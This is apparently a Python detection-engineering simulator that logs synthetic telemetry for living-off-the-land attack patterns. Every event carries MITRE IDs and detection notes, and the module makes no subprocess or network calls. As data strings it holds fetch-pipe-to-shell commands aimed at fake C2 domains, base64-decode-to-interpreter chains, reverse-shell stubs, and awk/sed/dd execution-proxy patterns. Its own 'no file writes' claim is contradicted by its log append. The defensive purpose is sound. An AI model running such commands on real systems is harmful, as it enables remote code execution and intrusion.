from core.engine.payload_registry import register_payload
#!/usr/bin/env python3
# SHENRON: Living off the Land (LOtL) — execution proxy and interpreter abuse simulator
# PURPOSE: Emit defender-observable telemetry for LOtL execution patterns
# PRINCIPLE: Observable adversarial behavior, not portable adversarial procedure
# MITRE: T1059 (Command and Scripting Interpreter), T1059.004 (Unix Shell),
#        T1059.006 (Python), T1059.007 (JavaScript), T1140 (Deobfuscate/Decode),
#        T1027 (Obfuscated Files or Information), T1105 (Ingress Tool Transfer)
# DETECTION NOTES:
#   - Alert on: interpreter spawned with -c flag and inline code
#   - curl/wget piped directly to shell (no intermediate file)
#   - base64 decode chains feeding into interpreter
#   - awk/sed/python used as execution proxies
#   - network fetch immediately followed by interpreter spawn
#   - interpreter spawned from non-standard parent (web server, cron, service)
# NO SUBPROCESS CALLS — all execution patterns are synthetic
# NO NETWORK CALLS — all fetch patterns are synthetic

import os
import json
import uuid
import random
import base64
from datetime import datetime, timezone
from pathlib import Path
from core.config import artifact_log_path as _artifact_log_path


def _get_artifact_log():
    p = _artifact_log_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    return p


# ── Synthetic data pools ───────────────────────────────────────────────────────

LOTL_INTERPRETERS = ["python3", "python", "bash", "sh", "perl", "ruby", "node"]

LOTL_FETCH_TOOLS = ["curl", "wget", "fetch", "lwp-request"]

LOTL_PROXY_TOOLS = ["awk", "sed", "tee", "xargs", "find", "dd"]

FAKE_INLINE_PAYLOADS = [
    "import os,socket,subprocess;...",
    "exec(__import__('base64').b64decode('...'))",
    "require('child_process').exec('...')",
    "$({curl,-s,http://...})",
    "eval($(curl -s http://...))",
]

FAKE_ENCODED_BLOBS = [
    base64.b64encode(b"synthetic_payload_sim").decode(),
    base64.b64encode(b"exec_stub_sim").decode(),
    base64.b64encode(b"loader_sim").decode(),
]

FAKE_PARENT_PROCESSES = [
    "apache2", "nginx", "crond", "systemd", "sshd",
    "python3 manage.py", "node server.js", "ruby app.rb",
]

FAKE_C2_DOMAINS = [
    "cdn-assets.delivery-net.io",
    "update.platform-metrics.com",
    "api.telemetry-svc.net",
]


# ── Event emission helpers ─────────────────────────────────────────────────────

def _log_event(event: dict):
    with open(_get_artifact_log(), "a") as f:
        f.write(json.dumps(event) + "\n")


def _base_event(session_id: str, mitre: list, behavior: str, opps: list, phase: str) -> dict:
    return {
        "artifact_id":            str(uuid.uuid4()),
        "session_id":             session_id,
        "layer":                  "lotl_execution_sim",
        "phase":                  phase,
        "mitre_techniques":       mitre,
        "behavior_class":         behavior,
        "detection_opportunities": opps,
        "simulation_only":        True,
        "executable":             False,
        "no_payload_present":     True,
        "network_calls_made":     False,
        "subprocess_spawned":     False,
        "timestamp":              datetime.now(timezone.utc).isoformat(),
    }


# ── Phase 1: Inline interpreter execution ─────────────────────────────────────
# interpreter -c "inline code" — most common LOtL pattern
# Detection: interpreter spawned with -c flag, no script file argument

def _phase_inline_exec(session_id: str):
    interp = random.choice(LOTL_INTERPRETERS)
    payload = random.choice(FAKE_INLINE_PAYLOADS)
    parent = random.choice(FAKE_PARENT_PROCESSES)

    event = _base_event(
        session_id,
        mitre=["T1059", "T1059.004", "T1059.006"],
        behavior="interpreter_inline_exec_sim",
        opps=[
            "interpreter_spawn_no_script_arg_sim",
            "shell_spawn_sim",
            "python_process_spawned_with_no_visible_script",
        ],
        phase="inline_execution",
    )
    event.update({
        "interpreter_sim":        interp,
        "flag_sim":               "-c",
        "inline_payload_sim":     payload,
        "parent_process_sim":     parent,
        "cmdline_sim":            f"{interp} -c '{payload}'",
        "detection_note":         (
            f"'{interp} -c' with inline code from parent '{parent}' — "
            f"no script file on disk. High-signal LOtL pattern."
        ),
    })
    _log_event(event)
    return event


# ── Phase 2: Fetch-and-execute chain ──────────────────────────────────────────
# curl http://... | bash — network fetch piped directly to interpreter
# Detection: network connection immediately followed by interpreter spawn,
#            no intermediate file write

def _phase_fetch_exec(session_id: str):
    fetcher = random.choice(LOTL_FETCH_TOOLS)
    interp = random.choice(["bash", "sh", "python3"])
    domain = random.choice(FAKE_C2_DOMAINS)
    path_sim = f"/stage/{uuid.uuid4().hex[:8]}.sh"

    event = _base_event(
        session_id,
        mitre=["T1059", "T1059.004", "T1105"],
        behavior="fetch_exec_chain_sim",
        opps=[
            "outbound_connection_non_standard_port_non_network_process",
            "shell_spawn_sim",
            "script_execution_sim",
            "data_transfer_sim",
        ],
        phase="fetch_execution",
    )
    event.update({
        "fetcher_sim":            fetcher,
        "interpreter_sim":        interp,
        "url_sim":                f"https://{domain}{path_sim}",
        "pipe_chain_sim":         f"{fetcher} -s https://{domain}{path_sim} | {interp}",
        "no_intermediate_file":   True,
        "detection_note":         (
            f"'{fetcher}' output piped directly to '{interp}' — "
            f"no intermediate file written. "
            f"Network process followed immediately by interpreter spawn."
        ),
    })
    _log_event(event)
    return event


# ── Phase 3: Base64 decode chain ──────────────────────────────────────────────
# echo <b64> | base64 -d | bash — encoded payload decoded at runtime
# Detection: base64 decode immediately feeding interpreter,
#            high-entropy string in command line

def _phase_b64_chain(session_id: str):
    blob = random.choice(FAKE_ENCODED_BLOBS)
    interp = random.choice(["bash", "sh", "python3", "perl"])
    decode_tool = random.choice(["base64", "openssl enc -d -base64", "python3 -c 'import base64...'"])

    event = _base_event(
        session_id,
        mitre=["T1059", "T1140", "T1027"],
        behavior="b64_decode_chain_sim",
        opps=[
            "obfuscated_blob_write_sim",
            "shell_spawn_sim",
            "interpreter_spawn_no_script_arg_sim",
            "encoded_config_drop_sim",
        ],
        phase="decode_execution",
    )
    event.update({
        "encoded_blob_sim":       blob,
        "decode_tool_sim":        decode_tool,
        "interpreter_sim":        interp,
        "cmdline_sim":            f"echo {blob} | {decode_tool} | {interp}",
        "entropy_sim":            "high — base64 encoded payload in cmdline",
        "detection_note":         (
            f"Base64 blob decoded at runtime and piped to '{interp}'. "
            f"High-entropy string in command line args. "
            f"No payload file written to disk."
        ),
    })
    _log_event(event)
    return event


# ── Phase 4: Proxy tool abuse ─────────────────────────────────────────────────
# awk/sed/find used as execution proxies
# Detection: proxy tool invoked with exec/system/BEGIN patterns,
#            non-standard usage of filesystem utilities

def _phase_proxy_abuse(session_id: str):
    tool = random.choice(LOTL_PROXY_TOOLS)
    parent = random.choice(FAKE_PARENT_PROCESSES)

    proxy_patterns = {
        "awk":  "awk 'BEGIN {system(\"cmd_sim\")}'",
        "sed":  "sed -e 's/.*//' -e 'e cmd_sim'",
        "find": "find / -name '*.conf' -exec cmd_sim {} \\;",
        "xargs": "echo cmd_sim | xargs -I{} bash -c {}",
        "tee":  "cmd_sim | tee /tmp/.out_sim | bash",
        "dd":   "dd if=/dev/stdin | bash",
    }
    cmdline = proxy_patterns.get(tool, f"{tool} exec_sim")

    event = _base_event(
        session_id,
        mitre=["T1059", "T1059.004", "T1027"],
        behavior="proxy_tool_abuse_sim",
        opps=[
            "shell_spawn_sim",
            "script_execution_sim",
            "stdout_stderr_both_devnull_on_spawned_process",
            "subprocess_popen_devnull_spawn_sim",
        ],
        phase="proxy_execution",
    )
    event.update({
        "proxy_tool_sim":         tool,
        "cmdline_sim":            cmdline,
        "parent_process_sim":     parent,
        "detection_note":         (
            f"'{tool}' used as execution proxy from parent '{parent}'. "
            f"Legitimate uses of '{tool}' rarely invoke system/exec. "
            f"Correlate with parent process and network activity."
        ),
    })
    _log_event(event)
    return event


# ── Phase 5: Environment variable execution ───────────────────────────────────
# $VAR execution — payload stored in env var, executed via eval/$()
# Detection: environment variable containing executable content,
#            eval or $() with env var reference

def _phase_env_exec(session_id: str):
    var_name = random.choice(["PATH_EXT", "LD_PAYLOAD", "INIT_CMD", "BOOTSTRAP"])
    interp = random.choice(["bash", "sh"])
    payload = random.choice(FAKE_INLINE_PAYLOADS)

    event = _base_event(
        session_id,
        mitre=["T1059", "T1059.004", "T1027"],
        behavior="env_var_exec_sim",
        opps=[
            "shell_spawn_sim",
            "rc_file_modified_by_non_shell_process",
            "background_launch_pattern_in_rc_file",
            "interpreter_spawn_no_script_arg_sim",
        ],
        phase="env_execution",
    )
    event.update({
        "env_var_sim":            var_name,
        "payload_sim":            payload,
        "exec_pattern_sim":       f"eval ${var_name}",
        "interp_sim":             interp,
        "detection_note":         (
            f"Payload stored in env var '{var_name}' and executed via eval. "
            f"No file on disk. Env vars containing executable content "
            f"rarely legitimate outside of controlled CI/CD contexts."
        ),
    })
    _log_event(event)
    return event


# ── Phase 6: Script interpreter masquerade ────────────────────────────────────
# python3 named as 'kworker', bash named as 'systemd-udevd' etc.
# Detection: interpreter process with name not matching binary path

def _phase_interp_masquerade(session_id: str):
    interp = random.choice(LOTL_INTERPRETERS)
    fake_names = ["kworker/0:1", "systemd-udevd", "sshd", "dbus-daemon", "watchdog/0"]
    fake_name = random.choice(fake_names)

    event = _base_event(
        session_id,
        mitre=["T1059", "T1036", "T1036.005"],
        behavior="interpreter_masquerade_sim",
        opps=[
            "python_process_spawned_with_no_visible_script",
            "filename_mimics_known_daemon",
            "executable_system_daemon_name_in_nonstandard_location",
            "hash_mismatch_filename_vs_known_good_binary",
        ],
        phase="masquerade_execution",
    )
    event.update({
        "real_binary_sim":        f"/usr/bin/{interp}",
        "masquerade_name_sim":    fake_name,
        "argv0_sim":              fake_name,
        "detection_note":         (
            f"'{interp}' binary running with argv[0]='{fake_name}'. "
            f"Process name does not match binary path. "
            f"Classic interpreter masquerade — correlate /proc/<pid>/exe with comm."
        ),
    })
    _log_event(event)
    return event


# ── Layer registration ─────────────────────────────────────────────────────────

@register_payload("lotl_execution_sim")
def main():
    session_id = str(uuid.uuid4())
    events = []

    phases = [
        ("inline_exec",       _phase_inline_exec),
        ("fetch_exec",        _phase_fetch_exec),
        ("b64_chain",         _phase_b64_chain),
        ("proxy_abuse",       _phase_proxy_abuse),
        ("env_exec",          _phase_env_exec),
        ("interp_masquerade", _phase_interp_masquerade),
    ]

    print(f"\n  [SIMULATION]  lotl_execution_sim")
    print(f"  [SESSION]     {session_id}")
    print(f"  [EVENTS]      {len(phases)}")
    print(f"  [MITRE]       T1059, T1059.004, T1059.006, T1059.007, T1140, T1027, T1105, T1036")
    print(f"  [SUBPROCESS]  NOT CALLED — synthetic only")
    print(f"  [NETWORK]     NO CALLS MADE — synthetic only")
    print()

    for phase_name, phase_fn in phases:
        event = phase_fn(session_id)
        events.append(event)
        print(f"  [PHASE: {phase_name}]")
        print(f"    behavior      : {event['behavior_class']}")
        print(f"    detection     : {event['detection_opportunities'][0]}")
        print(f"    note          : {event.get('detection_note', '')[:80]}")
        print()

    log_path = _get_artifact_log()
    print(f"  [LOGGED]      {log_path}")
    print(f"  [SAFE]        no subprocess calls, no network, no file writes — simulation only")

    return events
